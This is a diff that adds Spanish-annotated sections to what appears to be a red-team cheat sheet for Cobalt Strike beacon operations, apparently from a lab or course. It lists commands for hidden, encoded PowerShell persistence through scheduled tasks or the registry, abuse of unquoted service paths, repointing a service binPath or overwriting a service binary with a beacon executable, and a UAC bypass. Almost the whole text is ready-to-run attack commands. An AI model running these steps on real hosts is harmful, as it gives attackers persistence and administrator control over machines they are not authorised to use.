@@ -97,3 +97,70 @@ Configuration of the Host Persistence
 ```
 execute-assembly SharPersist.exe -t [schtask | reg | startupfolder] -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc PAYLOAD_ENCODEADO" -n "TASK_NAME" -m add -o [hourly | daily | logon] [-f "filename"] [-k "REGISTRY_KEY_TO_MODIFIE" -v "REGISTRY_KEY_TO_CREATE"]
 ```
+
+# Host Privilege Escalation
+
+## Windows Services
+
+Mirar los servicios
+```
+run sc query
+```
+Mirar las propiedades del servicio
+```
+run Get-Service | fl
+```
+
+## Unquoted Service Paths
+
+Mirar los paths de los servicios
+```
+run wmic service get name, pathname
+```
+Mirar los permisos de objetos (carpetas, archivos...)
+```
+powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
+```
+Enumerar con SharpUp.exe
+```
+execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
+```
+Parar un servicio
+```
+run sc stop VulnService1
+```
+Activar un servicio
+```
+run sc start VulnService1
+```
+
+## Weak Service Permissions
+
+Mirar el nombre de los serivicios modificables
+```
+execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
+```
+Mirar los permisos con Get-ServiceAcl.ps1 [https://github.com/Sambal0x/tools/blob/master/Get-ServiceAcl.ps1]
+```
+powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
+```
+Modificar el path del servicio
+```
+run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
+```
+
+## Weak Service Binary Permissions
+
+Ver los permisos del binario
+```
+powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
+```
+Copiar el binario
+```
+copy "tcp-local_x64.svc.exe" "Service 3.exe"
+```
+
+## UAC Bypasses
+```
+elevate uac-schtasks tcp-local
+```
